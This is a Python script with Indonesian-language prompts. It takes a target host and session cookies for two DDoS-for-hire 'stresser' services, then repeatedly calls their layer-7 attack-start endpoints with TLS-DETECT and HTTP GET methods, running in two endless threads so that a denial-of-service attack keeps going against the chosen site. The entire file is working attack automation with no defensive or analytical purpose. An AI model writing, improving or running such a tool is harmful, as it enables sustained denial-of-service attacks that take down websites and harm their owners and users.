import requests
import time
import cowsay
from tqdm import tqdm
import sys
import threading

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def main():
    # Prompt user for shared name and host
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan URL host: ")

    # Prompt user for separate cookies
    cookie_1 = get_input("Masukkan cookie untuk redstresser.net: ")
    cookie_2 = get_input("Masukkan cookie untuk ddoser.vip: ")

    # Header templates
    headers_1 = {
        "Cookie": cookie_1,
        "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://redstresser.net/hub",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    headers_2 = {
        "Cookie": cookie_2,
        "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ddoser.vip/hub",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    # URLs
    url_1 = f"https://redstresser.net/complexx/layer7.php?type=start&host={host}&port=443&time=10&method=TLS-DETECT&totalservers=1&vip=undefined"
    url_2 = f"https://ddoser.vip/complexx/layer7.php?type=start&host={host}&port=443&time=10&method=HTTPGET&totalservers=1&vip=undefined"

    def request_loop(url, headers, delay):
        while True:
            try:
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    message = f"Copyright © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                    animate_cowsay(message)
                else:
                    slow_print(f"Error: {response.status_code}")
            except Exception as e:
                slow_print(f"Terjadi kesalahan: {e}")
            time.sleep(delay)

    # Create threads for concurrent execution
    thread_1 = threading.Thread(target=request_loop, args=(url_1, headers_1, 15))
    thread_2 = threading.Thread(target=request_loop, args=(url_2, headers_2, 11))

    # Start threads
    thread_1.start()
    thread_2.start()

    # Wait for threads to complete
    thread_1.join()
    thread_2.join()

if __name__ == "__main__":
    main()
